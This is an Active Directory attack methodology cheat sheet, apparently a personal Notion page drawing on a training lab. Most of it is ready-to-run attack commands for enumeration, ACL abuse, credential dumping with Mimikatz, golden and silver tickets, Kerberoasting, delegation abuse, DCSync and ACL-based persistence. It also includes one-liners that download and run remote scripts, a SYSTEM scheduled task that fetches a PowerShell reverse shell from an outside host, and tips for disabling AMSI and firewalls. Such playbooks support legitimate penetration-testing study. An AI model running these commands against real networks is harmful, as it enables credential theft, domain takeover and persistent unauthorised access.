# Active Directory Attack Methodology

Notion link: https://r3dbuck3t.notion.site/Active-Directory-Attack-Methodology-2ca1e61c714542fb9830860eb25160a7

# **Scanning**

**🛠️ Tools:**

- Invoke-PortScan

◾ **Perform a network scan with Invoke-PortScan** 

> **Invoke-Portscan -Hosts 172.16.3.11**
> 

> **Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet**
> 

> **Invoke-Portscan -Hosts "[webstersprodigy.net](http://webstersprodigy.net/),[google.com](http://google.com/),[microsoft.com](http://microsoft.com/)" -TopPorts 50**
> 

<p>&nbsp;</p>

# **Enumeration**

## **User, Group, OU, Forest Enumeration [ with Regular Privs]**

- [ ]  **List users and their groups**
- [ ]  **List users in the Domain Admin Groups**
- [ ]  **List user in other interesting groups, like**
    - **RDPUsers**
    - **DNSAdmins**
    - **Domain Admins**
    - **Enterprise Admins**
    - **Administrators**
    - **Backup Operators**
    - **Print Operators**
    - **Remote Desktop Users**
    - **Server Operators**

**🛠️ Tools:** 

- **PowerView**
- **Active Directory Module**

 **🔥 Enumeration steps:**

**◾ List users and their groups** 

> **Get-Netuser | select distinguishedname, samaccountname, description, memberof**
> 

**◾List of groups and their members** 

> **Get-NetGroup**
> 

> **Get-NetGroup "domain admins" -FullData | select member**
> 

**💡 Check if any of the users you have access to is a member of DA group**

**◾ List users in the Domain Admin Groups**

> **Get-NetGroupMember -GroupName "Domain Admins" | select groupname, membername**
> 

> **Get-NetGroupMember -GroupName "RDPUSERs" | select MemberName**
> 

**◾  List all machines in the domain** 

**Tool #1 PowerView**

> **get-netcomputer -fulldata**
> 

> **get-netcomputer -Fulldata | select samaccountname, description, serviceprincipalname**
> 

**Tool #2 AD Module**

> **Get-ADComputer -Filter * -Properties * | select samaccountname, MemberOf**


<p>&nbsp;</p>

## **ACL Enumeration & Abuse**

- [ ]  **Create a list of all found users, computers and groups**
- [ ]  **Check the ACLs for the users, computers and groups from the logged on user.**
- [ ]  **Check for modify rights/permissions for user and groups**
    - **Permissions to look for:**
        - **GenericAll - full rights to the object (add users to a group or reset user's password**
        - **GenericWrite - update object's attributes (i.e logon script)**
        - **WriteOwner - change object owner to attacker controlled user take over the object**
        - **WriteDACL - modify object's ACEs and give attacker full control right over the object**
        - **AllExtendedRights - ability to add user to a group or reset password**
        - **ForceChangePassword - ability to change user's password**
        - **Self (Self-Membership) - ability to add yourself to a group**

### **Users ACL**

`**Enumerate ACLs for All domain users**` 

> **Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs  | select IdentityReference, ActiveDirectoryRights, ObjectDN**
> 

**❓ What to look for**

- **Filter the results of Get-ObjectAcl for the `“IdentityReference”,` `“ActiveDirectoryRights”` attributes and check if your logged on account has any interesting permissions over the looked up account like `GenericAll or WriteProperty` or any of the above permissions.**
    
    > **Get-ObjectAcl -SamAccountName userName -ResolveGUIDs | select IdentityReference, ActiveDirectoryRights**
    > 
    
- **Run `Invoke-ACLScanner` with the username to verify if any permissions are abusable**
    
    > **Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "Users"} | select IdentityReference, ActiveDirectoryRights, ObjectDN**
    > 
    - **you can use “Users” for all users objects or specific username like student223**

**🔥 How to exploit**

- **If you have `GenericAll` permissions over lookup user, you reset the password of the user without knowing the old password as you have full control.**
- **If you have `WriteOwner` permission over the looked up account, you can take over the acocunt:**
    - **Set your account as the owner of other account ACL**
    - **Give your account permissions to change passwords on the target account ACL**
    - **Resource: [https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit)**

<p>&nbsp;</p>

### **Groups ACLs**

`**Look for specific AD right i.e. GenericAll for groups**`

> **Get-ObjectAcl "GroupName" -ResolveGUIDs  | select IdentityReference, ActiveDirectoryRights**
> 

> **Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}**
> 

**❓ How to use:**

- **Check all groups by either passing the groupname or its distinguished name.**
- **This step comes after enumerating users and their affiliated groups**
- **Filter for “ActiveDirectoryRights”  and “IdentityReference”**

- **Run `Invoke-ACLScanner` with the group name to verify if any permissions are abusable**
    
    > **Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "domain admins"} | select IdentityReference, ActiveDirectoryRights, ObjectDN**
    > 

**🔥 How to exploit**

- **check if the current user has any interesting privileges on the group like `GenericAll`,`WriteProperty`**
    - **If you do have these privs, you can add yourself to the group**
        
        > **net group "domain admins" userName /add /domain**
        > 
        
        > **Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"**
        
        
<p>&nbsp;</p>

### **Computer ACLs**

`**Look for GenericAll / GenericWrite / Write on Computer permissions on the computer objects**`

> **Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}**
> 

> **Get-ObjectAcl -SamAccountName "ComputerName" -ResolveGUIDs  | select IdentityReference, ActiveDirectoryRights**
> 

**❓ How to use:**

- **You can either use the samaccoutname of the computer or distinguishedname attribute**
- **Filter for “ActiveDirectoryRights”  and “IdentityReference”**

**🔥 How to exploit**

- **check if the current user has any interesting privileges over the machine like `GenericAll, GenericWrite or Write`**
- **If so you can add a new computer and**
    - **Kerberos Resource-based Constrained Delegation: Computer Object Takeover.**

**🟪 References:** 

- [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)


<p>&nbsp;</p>

# **Lateral Movement**

- **PSRemoting**
- **Pass/OverPass the hash**
- **Obtaining plaintext credentials**

**⚒️ Tools:**

- **PSRemoting**
- **Invoke-Mimikartz**
- **Mimikaz**
- **PowerView**

**📝 Tips:**

- **Copy files to the target to the Program File directory on the target machines to avoid `Constrained Language Mode (CLM)` with `Applocker` configuration.**
- **Also for the `Constrained Language Mode (CLM)` constraints , try running the scripts like `Invoke-Mimikatz` or `PowerShellTCP` reverse shell with the function calls included in the scripts themselves (last line at the end of the scripts).**
    - **Example: to create Invoke-MimikatzEx.ps1:**
        - **Create a copy of Invoke-Mimikatz.ps1 and rename it to Invoke-MimikatzEx.ps1.**
        - **Open Invoke-MimikatzEx.ps1 in PowerShell ISE (Right click on it and click Edit).**
        - **Add "Invoke-Mimikatz" (without quotes) to the end of the file.**

**🔥 Steps**

**◾ Check if you have local admin privileges on any machines**

> **Invoke-UserHunter -CheckAccess**
> 

> **Invoke-UserHunter  - “GroupName”**
> 

> **Find-LocalAdminAccess -Verbose**
> 

> **Find-WMILocalAdminAcces**
> 

> **Find-PSRemotingLocalAdminAccess**
> 

**🟪 Resource: [Find Local domain Admins ](https://www.notion.so/Find-Local-domain-Admins-20937936f81b4ab49356faa12c9de3cb)** 

**◾ Verify the access by running `Invoke-command`** 

> **Invoke-Command -ScriptBlock {whoami; hostname} -ComputerName “NAME”**
> 

**◾ Disable AMSI, Firewall and set the restriction policy to unrestricted.**

**🟪 Reference [Bypass Restrictions ](https://www.notion.so/Bypass-Restrictions-2ed81ac369694d499ee2bf64ef32e50c)** 

**◾ If you have administrative privs on the machine, dump the hashes.**

**Download Mimikatz with PowerShell**

> **iex ( iwr http:10.10.102.10/Invoke-Mimikatz.ps1 -UseBasicParsing)**
> 

**◾ Dump the crednetials with Mimikatz**

> **Invoke-Mimikatz -Command '"lsadump::lsa /patch"'**
> 

> **Invoke-Mimikatz -Command  '"token::elevate" "vault::cred /patch"'**
> 

> **Invoke-Mimikatz -Command '"sekurlsa::ekeys"'**
> 

**🟪 Reference [**Dumping Credentials - Mimikatz**](https://www.notion.so/Dumping-Credentials-Mimikatz-f49da00bcc2a48e0b7dc219846652243)** 

**◾ You can use OverPass the hash with the retrieved hashes `[Runs with Local Admin privs]`**

> **Invoke-Mimikatz -Command '"sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:powershell.exe"'**
> 

**🟪 Reference[Pass/OverPass-the-Hash](https://www.notion.so/Pass-OverPass-the-Hash-eb4c17fe3ae04d438282e384b693aa3b)** 


<p>&nbsp;</p>

# **Kerberos Attacks**

- **Golden Ticket**
- **Silver Ticket**
- **AS-REP Rosting**
- **Kerberoasting**
- **Targeted Kerberoasting**
- **Unconstrainted Delegation**
- **Constrained Delegation**
- **Resource-Bases Constrained Delegation**
- **DCSync Attack**

## **Golden tickets (TGT)**

**⛳ Requirements:**

- **Krbtgt Hash. Obtained through:**
    1. **Compromise the domain controller OR**
    2. **Compromised a user who has DA privileges OR** 
    3. **Compromise user with `DCSync` rights.**
- **Domain SID**

**❓Use Case:**

- **Create tickets to any service within the domain**

**🛠️ Tools:**

- **Invoke-Mimikatz**
- **Rubeus**

**🔥 Attack Steps:**

**◾ Request Golden ticket with the obtain krbtgt hash**

> **Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:DomainName  /sid:DomainSID /krbtgt:Hash id:502 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'**
> 

**◾Verify you have access to the domain controller directories through `CIFS` service or `WMI`.**

> **dir \\dcorp-dc.dollarcorp.moneycorp.local\C$**
> 

> **gwmi -Class win32_computersystem -ComputerName domainControllerName**
> 

**🟪 Resources:**

- [**https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#-pass-the-ticket--ticket-dump**](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#-pass-the-ticket--ticket-dump)


<p>&nbsp;</p>

## **Silver tickets (TGS)**

**Service tickets allow access only to the services themselves**

**⛳ Requirements:**

- **NTLM hash of a Service Account you want to access (User or Computer account depending on the service)**
- **Domain SID**

**❓Use Case:**

- **If  an attacker gains access to a computer running a service and  elevated to admin. they I could dump the `NTLM` hash of the service account (Computer or User) and generate silver tickets impersonating the user with Pass-The-Ticket attack - Injecting the tickets into the current session to access other available resources.**

**🛠️ Tools:**

- Invoke-Mimikatz

**📝 Tips:** 

- **Check User or computers with configured SPNs, and see if you have access to any of them**
- **Services to request:**
    - **HOST - allows to schedule a task on the target machine.**
    - **WMI [HOST + RPCSS]**
    - **CIFS**
    - **HTTP for PSRemoting**

**🔥Attack Steps:**

**Scenario #1 Silver ticket with Computer NTLM Hash**

**Services - CIFS, HOST, HTTP**

1. **Dump NTLM Hash of Computer Account**
2. **Create Silver Ticket Targeting CIFS Service on Computer**
3. **Forged TGS (Service Ticket) ticket is created allow you to access target service.**
4. **Access \\computername\C$ (Providing User has Access to Said Computer)**
5. **Copy payload.exe C:\Temp\payload.exe**
6. **Create Another Silver Ticket Targeting HOST Service**
7. **Create Scheduled Task**
8. **Boom - Payload.exe is spawned on the target machine.**

**Schedule Tasks:**

**Create a reverse shell task to get command execution**

> **schtasks /create /S ComputerName  /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object
Net.WebClient).DownloadString(''[http://192.168.100.1:808](http://192.168.100.1:808/)/Invoke-PowerShellTcp.ps1''')'"**
> 

**Run the task**

> **schtasks /Run /S ComputerName  /TN "STCheck"**
> 

**Setting Up Listener**

> **powercat -l -p 4444 -v -t 1024**
> 

**Scenario #2 Silver Ticket with User NTLM Hash** 

**Services: MSSQL**

1. **Dump NTLM hash of Service Account**
2. **Create Silver Ticket Targeting Service Account**
3. **Dump .kirbi Ticket**
4. **Inject .kirbi**
5. **Access MSSQL Resources**
6. **Databases or Shares (Maybe)**

**◾ Dump NTML hash of a service account. hashes can be obtained through mimikatz**

**◾ Request Silver ticket with the obtained user or computer hash**

> **Invoke-Mimikatz -Command ‘”kerberos::golden /id:1106 /domain:DomainName /sid:DomainSID /target:ComputerName /rc4:User OR Computer Hash /service:ServiceName /user:UserName or ComputerName /ptt ”’**
> 

**◾ Dumping Tickets**

> **Invoke-Mimikatz -Command '"kerberos::list /export"’**
> 

**◾ Inject the TGS ticket** 

> **Invoke-Mimikatz -Command '"kerberos::golden  /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'**
> 

**🟪 Resources:**

- [**https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#-pass-the-ticket--ticket-dump**](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#-pass-the-ticket--ticket-dump)


## **AS-REP Roasting**


<p>&nbsp;</p>

## **Kerberoasting**

**⛳ Requirements:**

- **Valid domain user account with credentials.**

**❓Use Case:**

- **Obtain hashes of weak services and crack the them offline to retrieve the cleartext passwords**

**🛠️ Tools:**

- **Rubeus**
- **PowerView**
- **Hashcat**
- **John**

**🔥 Attack Steps:**

**◾ Identify user account with running services [SPNs] . Check `ServicePrincipalName` attribute**

**PowerView**

> **Get-NetUser -SPN**
> 

**💡 We focus on user accounts only as computer accounts have difficult passwords.**

**◾ Request a service ticket for the allowed services**

**Method #1 PowerShell**

> **Add-Type -AssemblyNAme System.IdentityModel**
> 

> **New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"**
> 

**Method #2 Rubeus [Local Admin Priv session is needed ]**

> **.\Rubeus.exe kerberoast**
> 

**◾ Dump the tickets** 

**Method #1 Invoke-Mimikatz [Local Admin Priv session is needed ]**

> **Invoke-Mimikatz -Command '"kerberos::list /export"’**
> 

**Method #2 Rubeus [Local Admin Priv session is needed ]**

> **.\Rubeus.exe dump**
> 

**◾ Crack the hashes offline**

**Method #1 Hashcat**

> **hashcat -m 13100 --force <TGSs_file> <passwords_file>**
> 

**Method #2 John**

> **john --format=krb5tgs --wordlist=<passwords_file> <ticket_file>**
> 

**🟪 Resources:**

- **[Kerberoasting Service Accounts](https://www.notion.so/Kerberoasting-Service-Accounts-8cff124c6fdd4f3eabedb047fb63fe04)**
- [**https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#kerberoast**](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#kerberoast)
- [**https://medium.com/r3d-buck3t/attacking-service-accounts-with-kerberoasting-with-spns-de9894ca243f**](https://medium.com/r3d-buck3t/attacking-service-accounts-with-kerberoasting-with-spns-de9894ca243f)


<p>&nbsp;</p>

## **Targeted Kerberoasting**

**⛳ Requirements:**

- `**GenericAll` or `GenericWrite` rights over the user object. [Not a computer object]**
- **Set SPN on the user account in which we have the above rights on.**

**❓Use Case:**

- **If you get `GenericAll` ow `GenericWrite` permission over a user’s object, you can set an SPN to anything.**
- **We can then request a TGS without special privileges. The TGS can then be "Kerberoasted" OR you can pass it and gain access to the service (`Pass-the-ticket`)**

**🛠️ Tools:**

- **PowerView**
- **PowerView Dev**
- **Active Directory Module**
- **Invoke-Mimikatz**

**🔥 Attack Steps:**

**◾ Enumerate Users ACLs to see where the current user has `GenericAll` or `GenericWrite` permissions**

> **Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}**
> 

**◾ Check if the user you have `GenericAll` or `GenericWrite` rights has an SPN** 

**Method #1 PowerView Dev [run with local admin session]**

> **Get-DomainUser -Identity supportuser | select serviceprincipalname**
> 

**Method #2 AD Module**

> **Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName**
> 

**◾ Set a SPN for the user (must be unique for the domain)**

**Method #1 PowerView Dev  [run with local admin session]**

> **Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}**
> 

**Method #2 AD Module**

> **Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}**
> 

**◾ Request a TGS for the SPN**

> **Add-Type -AssemblyName System.IdentityModel**
> 

> **New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"**
> 

**◾ Export the tickets**

> **Invoke-Mimikatz -Command '"kerberos::list /export"'**
> 

**◾ Inject the ticket** 

> **Invoke-Mimikatz -Command '"kerberos::ptt 0;2ceb8b3]-2-0-60a10000-Administrator@krbtgtDOLLARCORP.MONEYCORP.LOCAL.kirbi"'**
> 

**💡 Tips: if the user has already an SPN set, and you want to access the server of that SPN, you can set the a different service to it.**

**Example: supportuser has SPN set to “MSSQL\dcorp.monerycorp.local” . if you have `GenericAll` or `GenericWrite` permissions over the support user, you can add another SPN like “CIFS\dcorp.monerycorp.local” and request a TGS ticket for CIFS service**

<p>&nbsp;</p>

## **Unconstrained Delegation**

**⛳ Requirements:**

- **User or computer account with unconstrained delegation enable.**
- **Local *admin privileges* on the delegated computer to dump the TGT tickets. If you compromised the server as a regular user, you would need to escalate to abuse this delegation feature.**

**❓ Use Case:**

- **For the unconstrained delegation you dump the tickets from the compromised delegated machine and inject them to access services.**
- You can monitor logins for DA with Rubues and inject the DA ticket into the attacking session to elevate to DA privs.
- **If the DA privs are obtain, you can perform DCSync attack and retrieve all hashes [see the DCSync section]**

**🛠️ Tools:**

- **PowerView**
- **Invoke-Mimikatz**
- **Rubeus**
- **MS-RPRN**

**🔥 Attack Steps**

**◾ Identify unconstrained delaegation machine** 

> **Get-NetComputer -Unconstrained | select -ExpandProperty name**
> 

**◾ Dump the ticket**

> **Invoke-Mimikatz -Command '"kerberos::list /export"’**
> 

**◾ If can’t find the domain admin ticket, setup a listener to monitor when the DA logs in to a resource  using Invoke-Hunter**

> **Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose**
> 

**◾ If the domain admin user logs in, you can dump the ticket again with Invoke-Mimikatz**

> **Invoke-Mimikatz -Command '"kerberos::list /export"’**
> 

**◾ Inject the ticket into the current session**

> **Invoke-Mimikatz -Command '"kerberos::ptt [0;6f5638a]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'**
> 

**Print Bug**

if the domain admin doesn't log into one of the services, we can use the print bug with admin privileges on the machine to force the domain admin to login to the DC

**🔥 Attack Steps**

**◾ copy Rubeus to the unconstrained delegation machine and start monitoring authentications with Rubeus**

> **.\Rubeus.exe monitor /interval:5 /nowrap**
> 

**◾ Run MS-PRRN to abuse the printer bug on the unconstrained delegation machine that you have admin privs on.**

> **.\MS-RPRN.exe \\target_machine  \\unconstrained_delegation_machine**
> 

> Ex: **.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorpappsrv.dollarcorp.moneycorp.local**
> 

◾ **Copy Base64EncodedTicket, remove unnecessary spaces and newline, if any, using a text editor and use the ticket with Rubes on our own machine.**

> **.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>**
> 

◾ Once the ticket is imported successfully, verify with **`klist`** coammnd

> klist
> 

 **🟪 Resources:** 

- [**https://medium.com/r3d-buck3t/attacking-kerberos-unconstrained-delegation-ef77e1fb7203**](https://medium.com/r3d-buck3t/attacking-kerberos-unconstrained-delegation-ef77e1fb7203)
- [https://www.notion.so/r3dbuck3t/Kerberos-Delegation-7a50e02ec3db40bebcd0583fd0b2db58](https://www.notion.so/Kerberos-Delegation-7a50e02ec3db40bebcd0583fd0b2db58)


<p>&nbsp;</p>

## **Constrained Delegation**

**⛳ Requirements:**

- A user or computer account with the delegation option enabled — ***“Trust This user/computer for delegation to specified services only”***.
- Local ***admin privileges*** on the delegated compromised host. If you compromised the server as a regular user, you would need to escalate to admin to abuse this delegation feature.

**❓ Use Case:**

- 

🛠️ **Tools:**

- **PowerView Dev Script [[link]](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)**
- **Active Directory Module [[link]](https://github.com/samratashok/ADModule)**
- **Rubeus [[link]](https://github.com/GhostPack/Rubeus).** For installation refer to this article **[[link]](http://edium.com/r3d-buck3t/play-with-hashes-over-pass-the-hash-attack-2030b900562d#45d7)**
- **Kekeo**
- **Invoke-Mimikatz**

**🔥 Attack Steps**

◾ **Identify the user/computer that has constrained delegation enabled.**

**Method 1: PowerView_dev**

> **Get-DomainUser -TrustedToAuth**
> 

> **Get-DomainComputer -TrustedToAuth**
> 

**Method 2: AD module**

> **Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo**
> 

**◾ Request `TGT` for the delegated user/computer  who we have access to with admin privs.**

**Tool 1: Kekeo**

> **.\kekeo.exe**
> 

> **kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local  /rc4:cc098f204c5887eaa8253e7c2749156f**
> 

**Tool 2: Rubeus**

> **rubeus.exe asktgt /user:userName /domain:DomainName /ntlm:Hash /outfile:FileName.tgt**
> 

**◾ Request TGS ticket for the** allowed **service** 

**Tool 1: Kekeo**

> **tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@
DOLLARCORP.MONEYCORP.LOCAL.kirbi  /user:Administrator@dollarcorp.moneycorp.local  /service:cifs/dcorpmssql.dollarcorp.moneycorp.LOCAL**
> 

**Tool 2: Rubeus**

> **.\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:"service/HOST" /impersonateuser:Administrator /ptt**
> 

**◾ Inject the TGS ticket to access the service** 

**Method 1: Invoke-Mimikatz**

> **Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'**
> 

**Method 2: Rubeus**

> **.\Rubeus.exe s4u /ticket:TGT_Ticket  /msdsspn:"TIME/dcorp-DC" /impersonateuser:Administrator  /ptt**
> 

🚦**TGT ticket from step 2** 

**◾ Request TGS ticket for an alternative** allowed **service** 

**Tool 1: Kekeo**

> **tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local  /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL | ldap/dcorpdc.dollarcorp.moneycorp.LOCAL**
> 

🚦 ldap is the alternatice service. For alternative services, choose a service allowed by the target.

**Tool 2: Rubeus**

> **.\Rubeus.exe s4u /ticket:TGT_Ticket  /msdsspn:"TIME/dcorp-DC" /impersonateuser:Administrator  altservice:LDAP /ptt**
> 

**◾ Inject the TGS ticket to access the service** 

**Method 1: Invoke-Mimikatz**

> **Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'**
> 

**💡 If the delegated machine allows a service on the DC like Time -msds-allowedtodelegateto : `{TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}`  you can request a TGS for   a different service and obtain access to the DC like CIFS or LDAP [perform DCSync attack]**

**💡 User or Computer hashes depending on which on is configured for constrained delegation.**

**🟪 Resources:** 

- [**https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13**](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13)
- [**https://www.notion.so/r3dbuck3t/Kerberos-Delegation-7a50e02ec3db40bebcd0583fd0b2db58**](https://www.notion.so/Kerberos-Delegation-7a50e02ec3db40bebcd0583fd0b2db58)


<p>&nbsp;</p>

## **Resource-Bases Constrained Delegation**

**⛳ Requirements:**

1. **Computer account has the `MsDS-AllowedToActOnBehalfOfOtherIdentity` attribute set.**
2. **A SPN set on that computer account that we want to gain access to.**
3. **Write Privilege on the computer object - `GenericAll`, `GenericWrite`, WriteDacl, WriteProperty, Write**

**Tools:**

- **PowerMad.ps1**
- **Rubeus**
- **PowerView Dev script**
- **PowerView**
- **Active Directory Module**

**Attack Steps:**

**Identify the ACl rights on a specific computer, you can use the target computer name or its distinguished name.**

> **Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=StudentDcorp,CN=Users,DC=offense,DC=local"}**
> 

**or**

> **Get-Acl -Path "AD:CN=SRV02,OU=servers,OU=ad-lab,DC=murph,DC=coop" | select -exp access | ?{$_.IdentityReference -eq "murph\regularuser2"}**
> 

**or**

> **Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "ComputerName"}**
> 

**or**

> **Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "ComputerName"}**
> 

**or**

> **Get-domainuser UsreName -properties objectsid | select -exp objectsid**
> 

> **Get-domainobjectacl DomainName | ?{$_.SecurityIdentifier -eq 'USER SID'}**
> 

`*** Username is attacker’s account**`

`***User SID is attacker’s SID**`

**Identify SPNs associated with a user or computer**

> **Get-NetUser -SPN**
> 

> **Get-netcomputer -fulldata | select name, serviceprincipalname**
> 

**Checking the MachineAccountQuota Value. By default, it allowed 10 machines** 

> **Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota’**
> 

**Use PowerMad to leverage MachineAccountQuota and make a new machine that we have control over**

> **$password = ConvertTo-SecureString 'ThisIsAPassword' -AsPlainText -Force**
> 

> **Import-Module .\PowerMad.ps1**
> 

> **New-MachineAccount -machineaccount RBCDMachine -Password $($password)**
> 

**Update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute with the new computer we created**

> **Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount RBCDMachine$**
> 

> **Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount**
> 

**🟪 Resources:**

- [**https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/**](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [**https://fatrodzianko.com/2019/12/18/resource-based-constrained-delegation/**](https://fatrodzianko.com/2019/12/18/resource-based-constrained-delegation/)
- [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

<p>&nbsp;</p>

## **DCSync Attack**

**⛳ Requirements:**

- **Domain Admin user or  user with DA privileges.**
- **Replication rights are added to the user’s account. The replication rights are already set for the domain admins, however, a user with DA privileges can add the replication rights to themselves. `DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges`**

**Tools:**

- **Active Directory Module**
- **Invoke-Mimikatz**
- **PowerView**
- [**Secretdump.py](http://Secretdump.py) from Impacket**

**Attack Steps**

**◾ Get the user Distinguished Name attribute with PowerView.**

> **Get-NetUser | select distinguishedname**
> 

**◾ Identity a user with replication rights set (`Generic All and Replication`) ACLs.  💡 User has to be a domain admin or has a DA privs**

**AD Module**

> **Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($.IdentityReference -match "UserName") -and (($.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}**
> 

**◾ Add replication rights to a user - [Domain Admin Shell Needed]**

**AD Module:**

> **Add-ObjectAcl  -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName UserName -Rights DCSync  -Verbose**
> 

**💡 Distinguished Name of the user**

**◾ Verify the rights are set properly**

**AD Module:**

> **Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($.IdentityReference -match "UserName") -and (($.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}**
> 

**◾ Dump the Krbtgt Hash**

**Tool #1 Invoke-Mimikatz**

> **Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'**
> 

> **Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'**
> 

**Tool #2  Seceret Dump**

**DCsync using [secretsdump.py](http://secretsdump.py/) from impacket with NTLM authentication**

> [**secretsdump.py](http://secretsdump.py/) <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm**
> 

**DCsync using [secretsdump.py](http://secretsdump.py/) from impacket with Kerberos Authentication**

> [**secretsdump.py](http://secretsdump.py/) -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm**
> 

**🟪 Resources:**

- [**https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#dcsync-attack**](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#dcsync-attack)
- [**https://icel0rd.notion.site/DCSync-03131cb6de284d9fb9a2ccc15f8b254f**](https://www.notion.so/DCSync-03131cb6de284d9fb9a2ccc15f8b254f)

<p>&nbsp;</p>

# **Domain Persistence**

- **Persistence with ACLs**

## **Persistence with ACLs - Accessing the machine**

**Modify the ACLs would help the attacker to return to the machine again without the need to have high privileges to access it.**

**⛳ Requirements:**

- **Administrative privileges on the machine to modify the object ACLs**

**❓ Purpose ACLs modification:**

- **Access the machine without admin privileges.**
- **Retrieve the machine hashes remotely.**
- **Use the hashes to create silver tickets. [Check silver ticket section ⬆️]**

**Tools:**

- **Race.ps1 [GitHub link]**
    - **Remote WMI**
    - **Remote PSRemoting**

**Attack Steps:**

**◾ Modify WMI security descriptors of a machine you have administrative control on** 

**Tool #1 Race:**

**On local machine**

> **Set-RemoteWMI -UserName student1 -Verbose**
> 

